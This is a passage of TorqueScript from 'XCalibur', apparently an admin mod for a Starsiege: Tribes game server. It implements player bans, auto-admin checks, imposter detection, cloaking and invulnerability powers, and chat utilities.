 	return true;
}

function XNameBan(%ip, %clname, %clientId, %AdminName, %reason)
{
 	for(%i=0; $PlayerName[%i] != ""; %i++)
 	{
 	}
 	CenterPrint(%clientId, "<F0>XCalibur: The Name <F1>[----->>  <F2>"@%clname@"<F1>  <<-----] <F0>Is Now Banned", 0);
 	file::delete("config\\NameBans.cs");
 	$PlayerName[%i] = %clname;
 	$PlayerIP[%i] = %ip;
 	$H1 = "          NAME BANS";
 	$B1 = " ";
	$NameBanReason[%i] = %reason;
 	$NameBannedBy[%i] = %AdminName;
 	Export("$H1", "config\\NameBans.cs", true);
 	Export("$B1", "config\\NameBans.cs", true);
 	export("$PlayerName*", "config\\NameBans.cs", true);
 	export("$PlayerIP*", "config\\NameBans.cs", true);
	export("$NameBanReason*", "config\\NameBans.cs", true);
 	export("$NameBannedBy*", "config\\NameBans.cs", true);
	%ip1 = "IP:"@XCalibur::TrimIP(%ip);
	banlist::add(%ip1, 9745649);
	banlist::export("config\\Banlist.cs");
 	return true;
}

function XTagBan(%clientId, %tag, %reason, %AdminName)
{
 	for(%i=0; $Tagban[%i] != ""; %i++)
 	{
 	}
 	CenterPrint(%clientId, "<F0>XCalibur: <F1>The Tag:  <F2>"@%tag@"<F1>  Is Now Banned", 0);
 	file::delete("config\\TagBans.cs");
 	$Tagban[%i] = %tag;
	$TagBannedBy[%i] = client::getName(%clientId);
	$TagBannedReason[%i] = %reason;
 	$H2 = "        TAG BANS";
 	$B2 = " ";
 	Export("$H2", "config\\TagBans.cs", true);
 	Export("$B2", "config\\TagBans.cs", true);
 	export("$Tagban*", "config\\TagBans.cs", true);
 	export("$TagBannedBy*", "config\\TagBans.cs", true);
	export("$TagBannedReason*", "config\\TagBANS.cs", true);
 	return true;
}

function PermBanMSG(%cl, %message) { 	Net::kick(%cl, "\n<jc>YOU HAVE JUST BEEN PERMANENTLY BANNED:\n\n<jc>"@%message@" "); }   


function KillBug::Swarmer(%clientId) { 	%player = Client::getOwnedObject(%clientId); 	if(($SwarmerRecharging[%player] != True) || Player::getItemCount(%player,SwarmerAmmo) < "10")  	{ 		$SwarmerRecharging[%player] = True; 		%guntype = Swarmer; 		schedule("RechargeAmmo(" @ %player @ ", " @ %guntype @ ");",0.075,%player); 	} }

function Client::getId(%name) { 	%count = 0; 	for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl)) 	{ 		%clName = Client::getName(%cl); 		if((String::findSubStr(%clName, %name) != "-1")) 		{ 			%clientId = %cl; 			%count++; 		} 	}

	if(%count == 0 || %count > 1) 		return false; 	else 		return %clientId; }

function WhereIs(%clientId,%name) { 	%player = Client::getOwnedObject(%clientId); 	if(String::findSubStr(%name, "enemy") != "-1" || String::findSubStr(%name, "allie") != "-1") 	{ 		WhereIs::FindTarget(%player,%name); 	} 	else 	{ 		%count = 0; 		for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl)) 		{ 			%clName = Client::getName(%cl); 			%senderName = Client::getName(%clientId); 			if(String::findSubStr(%clName, %name) != "-1") 			{ 				%targetId = %cl; 				%count++; 			} 		}

		if(%count == 0) 		{ 			Client::sendMessage(%clientId, 1, "CoreMAN's WI: Error - No such player with such name!!!~waccess_denied.wav"); 		} 		else if(%count > 1) 		{ 			Client::sendMessage(%clientId, 1, "CoreMAN's WI: Error - Be more specific in name!!!~waccess_denied.wav"); 		} 		else 		{ 			Client::sendMessage(%clientId, $MSGTypeTeamChat, "CoreMAN's WI:Searching for " @ Client::getName(%targetId) @ "...."); 			WhereIs::FindTarget(%player,%targetId); 		} 	} }

function WhereIs::FindTarget(%player,%whoId) {

	%clientId = player::getclient(%player);

	if(%whoId == "enemy" || %whoId == "allie" || %whoId == "-1")  	{ 		%target = WhereIs::FindGeneral(%player,%whoId);

		if(%target != "-1") 		{ 			if(%whoId == "-1") 			{ 				%whoId = "Allie or Enemy"; 			}

			%whoPlayer = Client::getOwnedObject(%target); 			%targetPos = GameBase::getPosition(%target); 			%posX = getWord(%targetPos,0); 			%posY = getWord(%targetPos,1); 			issueCommand(%clientId, %clientId, 3, "Yoohoo! I'm the nearest " @ %whoId @ " around this area!", %posX, %posY); 			return; 		} 		else 		{ 			Client::sendMessage(%clientId, 1, "CoreMAN's WI: Error - No player is alive besides you!!!~waccess_denied.wav"); 		} 	} 	else 	{ 		%whoPlayer = Client::getOwnedObject(%whoId); 		%targetPos = GameBase::getPosition(%whoPlayer); 		%posX = getWord(%targetPos,0); 		%posY = getWord(%targetPos,1); 		issueCommand(%clientId, %clientId, 3, "Yoohoo! He is over there!", %posX, %posY);

		if($CoreDebug) 		{ 			echo("%whoId: "@%whoId); 			echo("%whoPlayer: "@%whoPlayer); 			echo("%targetPos: "@%targetPos); 			echo("%posX: "@%posX); 			echo("%posY: "@%posY); 		} 		return; 	} }

function WhereIs::FindGeneral(%player,%option) { 	%set = newObject("set",SimSet); 	%tnum = containerBoxFillSet(%set,$SimPlayerObjectType ,%pos,999999,999999,999999,-999999); 

	%playerPos = GameBase::getPosition(%player);

	%team = GameBase::getTeam(%player);

	if (%tnum>0) 	{

		%closest = 1000; 		for (%i=0;%i<%tnum;%i++) 		{ 			%pl     = Group::getObject(%set,%i); 			%plTeam = GameBase::getTeam(%pl); 			%plPos  = GameBase::getPosition(%i);

			%distance = Vector::getDistance(%playerPos,%plPos); 			if(%distance < %closest) 			{ 				if((%option == "-1") || (%option == "enemy" && %team != %plTeam) || (%option == "allie" && %team == %plTeam || %option == "")) 				{ 					%closest = %distance; 					%closestPl = %i; 				} 			} 		} 		if(%cPlayer != "") 		{ 			deleteObject(%set); 			return "-1"; 		} 		else 		{ 			deleteObject(%set); 			return %closestPl; 		} 	} }

function XCaliburInfo(%clientId) { 	CenterPrint(%clientId, "<jc>************************\n<jc>*  <F2>XCALIBUR STATS<F0>  *\n<jc>************************", 3); 	schedule("XCal::Admins(" @ %ClientId @ ");",3); 	schedule("XCal::Admins1(" @ %ClientId @ ");",8); 	schedule("XCal::Admins2(" @ %ClientId @ ");",13); 	if($ClanMembers2 != "" && $ClanMembers3 != "") 	{ 		schedule("XCal::ClanMembers(" @ %ClientId @ ");",18); 		schedule("Xcal::ClanMembers2(" @ %clientId @ ");",23); 		schedule("Xcal::ClanMembers3(" @ %clientId @ ");",28); 		schedule("Xcal::Creator(" @ %clientId @ ");",33); 		 	} 	else if($ClanMembers2 != "" && $ClanMembers3 == "") 	{ 		schedule("XCal::ClanMembers(" @ %ClientId @ ");",18); 		schedule("Xcal::ClanMembers2(" @ %clientId @ ");",23); 		schedule("Xcal::Creator(" @ %clientId @ ");",28); 	} 	else if($ClanMembers2 == "" && $ClanMembers3 == "") 	{ 		schedule("XCal::ClanMembers(" @ %ClientId @ ");",18); 		schedule("Xcal::Creator(" @ %clientId @ ");",23); 	} 	else if($ClanMembers4 != "" && $ClanMembers3 != "") 	{ 		schedule("XCal::ClanMembers(" @ %ClientId @ ");",18); 		schedule("Xcal::ClanMembers2(" @ %clientId @ ");",23); 		schedule("Xcal::ClanMembers3(" @ %clientId @ ");",28); 		schedule("Xcal::ClanMembers4(" @ %clientId @ ");",33); 		schedule("Xcal::Creator(" @ %clientId @ ");",38); 	} 	else if($ClanMembers3 != "" && $ClanMembers4 == "") 	{ 		schedule("XCal::ClanMembers(" @ %ClientId @ ");",18); 		schedule("Xcal::ClanMembers2(" @ %clientId @ ");",23); 		schedule("Xcal::ClanMembers3(" @ %clientId @ ");",28); 		schedule("Xcal::Creator(" @ %clientId @ ");",33); 	} }

function XCal::Admins(%clientId) { 	CenterPrint(%clientId, "<jc>Server Name: <F2>"@$Server::HostName@" <F0>\n<jc>XCalibur's: "@$XCaliburAdmins@"", 5); } function XCal::Admins1(%clientId) { 	CenterPrint(%clientId, "<jc><F0>Master-Admins: "@$MasterAdmins@"",5); } function XCal::Admins2(%clientId) { 	%Num = getNumClients(); 	CenterPrint(%clientId, "<jc><F0>Super-Admins: "@$SuperAdmins@"\n<jc>Public-Admins: "@$PublicAdmins@"\nConnections: "@%Num@"", 5); }

function Xcal::ClanMembers(%clientId) { 	CenterPrint(%clientId, "<jc><F2>"@$ClanTag@"<F0> <jc>Clan Members:\n<jc>"@$ClanMembers@"", 5); }

function Xcal::ClanMembers2(%clientId) { 	CenterPrint(%clientId, "<jc><F2>"@$ClanTag@"<F0> Clan Members Continued:\n<jc>"@$ClanMembers2@"", 5); } function XCal::ClanMembers3(%clientId) { 	centerprint(%clientId, "<jc><F2>"@$ClanTag@"<F0> Clan Members Continued:\n<jc>"@$ClanMembers3@"", 5); } function XCal::ClanMembers4(%clientId) { 	centerprint(%clientId, "<jc><F2>"@$ClanTag@"<F0> Clan Members Continued:\n<jc>"@$ClanMembers4@"", 5); } function Xcal::Creator(%clientId) { 	CenterPrint(%clientId, "<jc><F2>XCALIBUR<F0> Was Created By <F1>WorstAim<F0>", 0); } function XCaliburCredits() { 	CenterPrintAll("I Could Not Have Made This Without Learning From CoreMAN and GreyBOT\n<F2>GreyBOT Was Created By |*|w00|*|Grey\n<F1>CoreMAN Was Created By [GL]JadaCyrus\n<F0>XCalibur Was Created By *}DM{*WorstAim"); 	return; } function CheckUserList(%name, %clientId) { 	$listed = false; 	%check = %name; 	echo($adminbotname @": Checking UserList for Comchat purposes. Checking for "@%check); 	for(%i=0; %i < 30 ;%i++) 	{ 		if((String::findSubStr($UserList[%i], %name) != "-1")) 		{ 			echo($adminbotname @": -->>WARNING<<-- Already on UserList : " @ $UserList[%i]); 			if(%count = "") 				%count = 1; 			else 				%count = %count + 1; 			$listed = true; 			if(%count = "1") 			{ 				client::Sendmessage(%clientId,1,$adminbotname@": This Name is already on user list. It cannot be added again. ~waccess_denied.wav"); 			} 		} 	}		 }

function impersonate(%clientId, %name, %message) { 	%admin = Client::getName(%clientId); 	for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl)) 	{ 		%name2 = Client::getName(%cl); 		if((String::findSubStr(%name2, %name) != "-1") && !%cl.isSuperAdmin) 		{ 			messageall(2, %name2@": "@%message); 		} 		else if((String::findSubStr(%name2, %name) != "-1") && %cl.isSuperAdmin) 		{ 			messageall(2, %admin@": I just tried to Impersonate "@%name2@". I tried to make him say, ' "@%message@" '. I know realise the error of my ways and I would like to Apologise."); 		}    	} }

function private(%clientId, %name, %message) { 	%admin = Client::getName(%clientId); 	for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl)) 	{ 		%name2 = Client::getName(%cl); 		if((String::findSubStr(%name2, %name) != "-1")) 		{ 			%client = Player::getClient(%cl); 			%goodname = Client::getName(%cl);

			if(%count == "") 			{ 				%count = 1; 		      } 			else 			{                	      %count = %count + 1;  			} 		}    	}       if(%count == "1") 	{ 		privatemessage(%clientId, %goodname, %message, %client); 	} 	else if(%count > "1") 	{ 		client::sendmessage(%clientId,1,$adminbotname@": There is more than one person connected with that as part of their name. Please Narrow Search.~waccess_denied.wav"); 	} 	else 	{ 		client::sendmessage(%clientId,1,$adminbotname@": You have selected either no name... or an unsuitable name.~waccess_denied.wav"); 	}		 } function privatemessage(%clientId,%goodname,%message,%client) { 	%admin = Client::getName(%clientId); 	%cli = Player::getClient(%client); 	client::sendmessage(%cli,3, "["@%admin@": PRIVATE] "@%message@"~wmine_act.wav"); 	client::sendmessage(%clientId,3, "[Private - "@%goodname@"] "@%message@"~wmine_act.wav"); } function Cloaker(%player) { 	%cl = Player::getclient(%player); 	for(%clientId = Client::getFirst(); %clientId != -1; %clientId = Client::getNext(%clientId)) 	{ 		%TargetPlayer = Client::getOwnedObject(%clientId); 		if(GameBase::GetTeam(%clientId) != GameBase::GetTeam(%player)) 		{ 			%UserPos=gamebase::getPosition(%player); 			%TargetPos=gamebase::getPosition(%TargetPlayer); 			%dist = Vector::getDistance(%UserPos, %TargetPos); 			%matrix = %clientId @ %player; 			if(%dist < 140 && $cloaked[%player] == 1) 			{

				if($cloakEffected[%matrix] != 1) 				{ 					Player::setDetectParameters(%Targetplayer, 50, 150); 					$TotalCloaks[%ClientId]++; 					$cloakEffected[%matrix] = 1; 				} 			} 			else 			{ 				if($cloakEffected[%matrix] == 1) $TotalCloaks[%ClientId]--; 				if($TotalCloaks[%ClientId] < 1) 				{ 					Player::setDetectParameters(%Targetplayer, 0.027, 0); 					$cloakEffected[%matrix] = 0; 				} 			} 		} 	} 	if(Player::isTriggered(%player, $BackPackSlot) && Player::getMountedItem(%player, $BackPackSlot) == "CloakingDevice" || %cl.beaconCloak)  	{ 		schedule("Cloaker(" @ %player @ ");", 0.5, %player); 	}

} function Gundam::Health(%clientId, %player) { 	GameBase::playSound(%player,ForceFieldOpen,0); 	%armor = Player::getArmor(%player);

		gameBase::setAutoRepairRate(%player, 1.10); 		Client::sendMessage(Player::getClient(%player),3,"Gundam AutoRepair Activated");

	if($healthTime[%clientId] == 0) 	{ 		$healthTime[%clientId] = 20; 		checkPlayerHealth(%clientId, %player); 	} 	else 	{ 		$healthTime[%clientId] = 20; 	} }


function checkPlayerHealth(%clientId, %player) { 	%armor = Player::getArmor(%player); 	if(%armor == "marmor" || %armor == "mfemale") 	{ 		if($healthTime[%clientId] > 0) 		{ 			$healthTime[%clientId] -= 2;   			schedule("checkPlayerHealth(" @ %clientId @ ", " @ %player @ ");",2,%player); 	    	} 		else 		{ 			Client::sendMessage(Player::getClient(%player),1,"Gundam AutoRepair OFF"); 			gameBase::setAutoRepairRate(%player, 0.01); 			GameBase::playSound(%player,ForceFieldClose,0);	 		}			 	} 	else 	{ 		Client::sendMessage(Player::getClient(%player),1,"Gundam AutoRepair OFF"); 		gameBase::setAutoRepairRate(%player, 0); 		GameBase::playSound(%player,ForceFieldClose,0);	 	} }


function Gundam::Cloak(%clientId, %player) { 	%clientid.beaconCloak = true; 	%armor = Player::getArmor(%player); 	GameBase::playSound(%player,ForceFieldOpen,0); 	GameBase::startFadeout(%player);  	$cloaked[%player] = 1;  	Cloaker(%player); 	%rate = Player::getSensorSupression(%player) + 300; 	Player::setSensorSupression(%player,%rate); 		Client::sendMessage(Player::getClient(%player),3,"Gundam Cloaking Activated"); 	 	if($cloakTime[%clientId] == 0) 	{ 		$cloakTime[%clientId] = 20; 		checkPlayerCloak(%clientId, %player); 	} 	else 	{ 		$cloakTime[%clientId] = 40; 	} }


function checkPlayerCloak(%clientId, %player) { 	%armor = Player::getArmor(%player); 	if (%armor == "BlastechM" || %armor == "BlastechF") 	{ 		if($cloakTime[%clientId] > 0) 		{ 			$cloakTime[%clientId] -= 2;   			schedule("checkPlayerCloak(" @ %clientId @ ", " @ %player @ ");",2,%player); 	    	} 		else 		{ 			Client::sendMessage(Player::getClient(%player),1,"Gundam Cloak OFF"); 			%clientid.beaconCloak = false; 			GameBase::playSound(%player,ForceFieldClose,0); 			GameBase::startFadein(%player); 			%rate = Player::getSensorSupression(%player) - 300; 			Player::setSensorSupression(%player,0); 		 	$cloaked[%player] = 0;  			Cloaker(%player); 		} 	} 	else 	{ 			Client::sendMessage(Player::getClient(%player),1,"Gundam Cloak OFF"); 			%clientid.beaconCloak = false; 			GameBase::playSound(%player,ForceFieldClose,0); 			GameBase::startFadein(%player); 			%rate = Player::getSensorSupression(%player) - 1; 			Player::setSensorSupression(%player,0); 		 	$cloaked[%player] = 0;  			Cloaker(%player); 	}		 } function Admin::Cloak(%client, %player) { 	%clientid.beaconCloak = true; 	%armor = Player::getArmor(%player); 	GameBase::playSound(%player,ForceFieldOpen,0); 	GameBase::startFadeout(%player);  	$cloaked[%player] = 1;  	Cloaker(%player); 	%rate = Player::getSensorSupression(%player) + 300; 	Player::setSensorSupression(%player,%rate); 	client::sendmessage(%client,3,"XCalibur: You are now cloaked. Please Dont Abuse"); 	 	if($cloakTime[%client] == 30) 	{ 		checkAdminCloak(%client, %player); 	} 	else 	{ 		$cloakTime[%client] = 30; 	} 	echo("Admin Cloaking Active"); }

function checkAdminCloak(%client, %player) { 	%armor = Player::getArmor(%player); 	 		if($cloakTime[%client] > 0) 		{ 			echo("REDUCING CLOAK TIME"); 			$cloakTime[%client] -= 2;   			schedule("checkAdminCloak(" @ %client @ ", " @ %player @ ");",2,%player); 	    	} 		else 		{ 			Client::sendMessage(Player::getClient(%player),1,"XCalibur: You are now Visible"); 			%clientid.beaconCloak = false; 			GameBase::playSound(%player,ForceFieldClose,0); 			GameBase::startFadein(%player); 			%rate = Player::getSensorSupression(%player) - 300; 			Player::setSensorSupression(%player,0); 		 	$cloaked[%player] = 0;  			Cloaker(%player); 		} 	 	 }

function DAdminCloak(%client, %player) { 	%aname = client::getName(%clientId); 	%armor = Player::getArmor(%player); 	Client::sendMessage(Player::getClient(%player),1,"XCalibur: You are now Visible"); 	%clientid.beaconCloak = false; 	GameBase::playSound(%player,ForceFieldClose,0); 	GameBase::startFadein(%player); 	%rate = Player::getSensorSupression(%player) - 300; 	Player::setSensorSupression(%player,0); 	$cloaked[%player] = 0;  	Cloaker(%player); }

function Gundam::Shield(%clientId, %player) { 	GameBase::playSound(%player,ForceFieldOpen,0); 	%armor = Player::getArmor(%player);

                %player.shieldStrength = 0.3; 		Client::sendMessage(Player::getClient(%player),3,"Gundam Shield Activated");

	if($shieldTime[%clientId] == 0) 	{ 		$shieldTime[%clientId] = 20; 		checkPlayerShield(%clientId, %player); 	} 	else 	{ 		$shieldTime[%clientId] = 20; 	} }


function checkPlayerShield(%clientId, %player) { 	%armor = Player::getArmor(%player); 	if (%armor == "larmor" || %armor == "lfemale") 	{ 		if($shieldTime[%clientId] > 0) 		{ 			$shieldTime[%clientId] -= 2;   			schedule("checkPlayerShield(" @ %clientId @ ", " @ %player @ ");",2,%player);     		} 		else 		{ 			Client::sendMessage(Player::getClient(%player),1,"Gundam Shield OFF"); 			%player.shieldStrength = 0; 			GameBase::playSound(%player,ForceFieldClose,0);	 		}			 	} 	else 	{ 		Client::sendMessage(Player::getClient(%player),1,"Gundam Shield OFF"); 		%player.shieldStrength = 0; 		GameBase::playSound(%player,ForceFieldClose,0);	 	} }

function Admin::Shield(%clientId, %player) { 	GameBase::playSound(%player,ForceFieldOpen,0);       %player.shieldStrength = 999.3; 	bottomprint(Player::getClient(%player),"<jc><f0>You have been granted<f1> Temporary Invulnerability<f0> by Admin."); 	if($shieldTime[%clientId] == 0) 	{ 		$shieldTime[%clientId] = 30; 		checkPlayerShieldadmin(%clientId, %player); 	} 	else 	{ 		$shieldTime[%clientId] = 30; 	} } function Admin::imo1(%clientId, %player) { 	GameBase::playSound(%player,ForceFieldOpen,0);       %player.shieldStrength = 999.3; 	bottomprint(Player::getClient(%player),"<jc><f0>You have been granted<f1> Temporary Invulnerability<f0> by Admin."); 	if($shieldTime[%clientId] == 0) 	{ 		$shieldTime[%clientId] = 60; 		checkPlayerShieldadmin(%clientId, %player); 	} 	else 	{ 		$shieldTime[%clientId] = 60; 	} } function Admin::imo2(%clientId, %player) { 	GameBase::playSound(%player,ForceFieldOpen,0);       %player.shieldStrength = 999.3; 	bottomprint(Player::getClient(%player),"<jc><f0>You have been granted<f1> Temporary Invulnerability<f0> by Admin."); 	if($shieldTime[%clientId] == 0) 	{ 		$shieldTime[%clientId] = 120; 		checkPlayerShieldadmin(%clientId, %player); 	} 	else 	{ 		$shieldTime[%clientId] = 120; 	} }


function checkPlayerShieldadmin(%clientId, %player) { 	%armor = Player::getArmor(%player); 	 		if($shieldTime[%clientId] > 0) 		{ 			echo("REDUCING SHIELD TIME"); 			$shieldTime[%clientId] -= 2;   			schedule("checkPlayerShieldadmin(" @ %clientId @ ", " @ %player @ ");",2,%player);     		} 		else 		{ 			bottomprint(Player::getClient(%player),"<jc><f0>Y O U  A R E  M O R T A L  A G A I N"); 			messageall(1, Client::getName(%clientId) @ " is now mortal again!"); 			%player.shieldStrength = 0; 			echo("Shield Inactive"); 			GameBase::playSound(%player,ForceFieldClose,0);	 		}			 }

function Admin::Immortal(%client, %player) { 	%name109 = Client::getName(%client); 	%player = Client::getOwnedObject(%client); 	Player::setDamageFlash(%player, 75); 	GameBase::playSound(%player,ForceFieldOpen,0);         %player.shieldStrength = 999.3; 	if($shieldTime[%client] == 30) 	{ 		checkPlayerShieldImmortal(%client, %player); 	} 	else 	{ 		$shieldTime[%client] = 30; 	} 	echo("Admin Invulnerability Active"); }	

function checkPlayerShieldImmortal(%client, %player) { 	%armor = Player::getArmor(%player); 	 	if($shieldTime[%client] > 0) 	{ 		echo("REDUCING SHIELD TIME"); 		$shieldTime[%client] -= 2;   		schedule("checkPlayerShieldImmortal(" @ %client @ ", " @ %player @ ");",2,%player);     	} 	else 	{ 		bottomprint(Player::getClient(%player),"<jc><f0>Y O U  A R E  M O R T A L  A G A I N"); 		%player.shieldStrength = 0; 		echo("Shield Inactive"); 		GameBase::playSound(%player,ForceFieldClose,0);	 	}			 } function Server::onClientConnect(%clientId) {    if(!String::NCompare(Client::getTransportAddress(%clientId), "LOOPBACK", 8))    {              %clientId.isAdmin = true;       %clientId.isSuperAdmin = true;    }    echo("CONNECT: " @ %clientId @ " \"" @        escapeString(Client::getName(%clientId)) @        "\" " @ XCalibur::TrimIP(Client::getTransportAddress(%clientId)));

   

   %clientId.noghost = true;    %clientId.messageFilter = -1;     remoteEval(%clientId, SVInfo, version(), $Server::Hostname, $modList, $Server::Info, $ItemFavoritesKey);    if(!$Tactical) { remoteEval(%clientId, MODInfo, "<F0>"@$ModName@" By: <F2>"@$ModCreator@"<f0>\n<F1>"@$ConnectionInfo@"<F0>\n"@$ConnectionInfo2@"\n<f2>This Server Is Running The XCalibur Admin Program"); } else if($Tactical) { remoteEval(%clientId, MODInfo, $MODInfoT); }   remoteEval(%clientId, FileURL, $Server::FileURL);


	OtherFuncs(%clientId);   	Game::onPlayerConnected(%clientId); 	PlayerCheck(%clientId); }

function PlayerCheck(%clientId) { 	Imposter(%clientId); 	if($AutoAdmin) 	{ 		AutoImposter(%clientId); 	} 	if($MemberTagCheck::Activated) 	{ 		Tagless(%clientId); 	} 	Tactical(%clientId); Normal(%clientId); 	XCheck(%clientId); 	Member(%clientId); 	AutoAdmin(%clientId); 	Tag(%clientId); 	Name1Ban(%clientId); 	IP1Ban(%clientId); 	Perma1Ban(%clientId); 	NewPerson(%clientId); }

function MATCHM(%clientId) { 	client::sendMessage(%clientId, 4, "XCALIBUR: MATCH FOUND:  -=| *Master-Admin Granted* |=-"); 	client::sendMessage(%clientId, 4, "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="); } function MATCHX(%clientId) { 	client::sendMessage(%clientId, 4, "XCALIBUR: MATCH FOUND:  -=| *XCalibur Granted* |=-"); 	client::sendMessage(%clientId, 4, "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="); } function MATCHS(%clientId) { 	client::sendMessage(%clientId, 4, "XCALIBUR: MATCH FOUND:  -=| *Super-Admin Granted* |=-"); 	client::sendMessage(%clientId, 4, "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="); } function MATCHP(%clientId) { 	client::sendMessage(%clientId, 4, "XCALIBUR: MATCH FOUND:  -=| *Public-Admin Granted* |=-"); 	client::sendMessage(%clientId, 4, "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="); } function CHECK(%clientId) { 	%name = client::getName(%clientId); 	%ip = "IP:"@XCalibur::TrimIP(client::getTransportAddress(%clientId)); 	client::sendMessage(%clientId, 4, "Checking IP ("@%ip@")"); 	client::sendMessage(%clientId, 4, "Checking Name ("@%name@")"); } function XMesX(%clientId) { 	client::sendMessage(%clientId, 4, "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="); 	client::sendMessage(%clientId, 4, "**********************"); 	client::sendMessage(%clientId, 4, "*  XCALIBUR SCAN*"); 	client::sendMessage(%clientId, 4, "**********************"); 	CHECK(%clientId); 	MATCHX(%clientId); } function XMesM(%clientId) { 	client::sendMessage(%clientId, 4, "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="); 	client::sendMessage(%clientId, 4, "**********************"); 	client::sendMessage(%clientId, 4, "*  XCALIBUR SCAN*"); 	client::sendMessage(%clientId, 4, "**********************"); 	CHECK(%clientId); 	MATCHM(%clientId); } function XMesS(%clientId) { 	client::sendMessage(%clientId, 4, "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="); 	client::sendMessage(%clientId, 4, "**********************"); 	client::sendMessage(%clientId, 4, "*  XCALIBUR SCAN*"); 	client::sendMessage(%clientId, 4, "**********************"); 	CHECK(%clientId); 	MATCHS(%clientId); } function XMesP(%clientId) { 	client::sendMessage(%clientId, 4, "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="); 	client::sendMessage(%clientId, 4, "**********************"); 	client::sendMessage(%clientId, 4, "*  XCALIBUR SCAN*"); 	client::sendMessage(%clientId, 4, "**********************"); 	CHECK(%clientId); 	MATCHP(%clientId); }

function AutoAdmin(%clientId) { 	%name = client::getName(%clientId); 	%ip = "IP:"@XCalibur::TrimIP(client::getTransportAddress(%clientId)); 	if($AutoAdmin) 	{ 		XAuto(%clientId, %ip, %name); 		MAuto(%clientId, %ip, %name); 		SAuto(%clientId, %ip, %name); 		PAuto(%clientId, %ip, %name); 	} }

function XAuto(%clientId, %ip, %name) { 	for(%i = 0; $XAdminName[%i] != ""; %i++)  	{ 		if(string::findsubstr(%name, $XAdminName[%i]) != "-1" && $XAdminIP[%i] != "" && string::findsubstr(%ip, $XAdminIP[%i]) != "-1") 		{ 			echo("XCalibur Auto Admin Granted =-=-=>  "@%name@"  <=-=-="); 			XMesX(%clientId); 			%clientId.isXcal = true; %clientId.isGrey = true; %clientId.isAdmin = true; %clientId.isSuperAdmin = true; 		} 	} } function MAuto(%clientId, %ip, %name) { 	for(%i = 0; $MAdminName[%i] != ""; %i++)  	{ 		if(string::findsubstr(%name, $MAdminName[%i]) != "-1" && $MAdminIP[%i] != "" && string::findsubstr(%ip, $MAdminIP[%i]) != "-1") 		{ 			echo("Master Auto Admin Granted =-=-=>  "@%name@"  <=-=-="); 			XMesM(%clientId); 			%clientId.isGrey = true; %clientId.isAdmin = true; %clientId.isSuperAdmin = true; 		} 	} } function SAuto(%clientId, %ip, %name) { 	for(%i = 0; $SAdminName[%i] != ""; %i++)  	{ 		if(string::findsubstr(%name, $SAdminName[%i]) != "-1" && $SAdminIP[%i] != "" && string::findsubstr(%ip, $SAdminIP[%i]) != "-1") 		{ 			echo("Super Auto Admin Granted =-=-=>  "@%name@"  <=-=-="); 			XMesS(%clientId); 			%clientId.isAdmin = true; %clientId.isSuperAdmin = true; 		} 	} } function PAuto(%clientId, %ip, %name) { 	for(%i = 0; $PAdminName[%i] != ""; %i++)  	{ 		if(string::findsubstr(%name, $PAdminName[%i]) != "-1" && $PAdminIP[%i] != "" && string::findsubstr(%ip, $PAdminIP[%i]) != "-1") 		{ 			echo("Public Auto Admin Granted =-=-=>  "@%name@"  <=-=-="); 			XMesP(%clientId); 			%clientId.isAdmin = true; 		} 	} }		

function Imposter(%clientId) 
{ 	
	%name = Client::getName(%clientId); 	
	%ip = "IP:"@XCalibur::TrimIP(Client::getTransportAddress(%clientId)); 	
	for (%i = 0; %i < 100; %i++) 	
	{ 		
		if(%name == $MemberName[%i] && %ip != $ClanMemberIP[%i] && $ClanMemberIP[%i] != "")
 		{	 			
			%clientId.isImposter = true;
 			echo("IMPOSTER: ++++> "@%name@" <++++");
 			$Name = %name;
 			$IP = %ip;
 			$Space = "--------------------------------------------------------------";
 			export("$Name", "config\\imposters.txt", true);
 			export("$IP", "config\\imposters.txt", true);
 			export("$Space", "config\\imposters.txt", true);
 			for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
    			{
    				%client = Player::getClient(%cl);
 				if(%client.isGrey)
 				{
 					bottomprint(%client, "<jc><F0>XCALIBUR WARNING: <F1>IMPOSTER: ++++> <F2>"@%name@"<F1> <++++", 5);
 				}
 			}
 			schedule("centerprint(" @ %clientId @ ", \"<jc><f1>XCalibur: YOU HAVE 10 SECONDS TO GET OFF THAT NAME AND GET ON ANOTHER BEFORE YOUR KICKED\", 0);", 60);
 			schedule("KickImposter(" @ %clientId @ ");", 50, %clientId);
			return;
 		}
	}
}	
function otherImposter(%clientId, %info)
{
	%name = client::getName(%clientId);
	for(%i = 0; $OtherInfoField[%i] != ""; %i++)
	{
		%pw = $OtherInfoField[%i];
		%storedname = $OtherMemberName[%i];
		if(%info != %pw && %name == %storedname && %storedname != "")
		{
 			%clientId.isImposter = true;
 			echo("IMPOSTER: ++++> "@%name@" <++++");
 			$Name = %name;
 			$IP = %ip;
 			$Space = "--------------------------------------------------------------";
 			export("$Name", "config\\imposters.txt", true);
 			export("$IP", "config\\imposters.txt", true);
 			export("$Space", "config\\imposters.txt", true);
 			for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
    			{
    				%client = Player::getClient(%cl);
 				if(%client.isGrey)
 				{
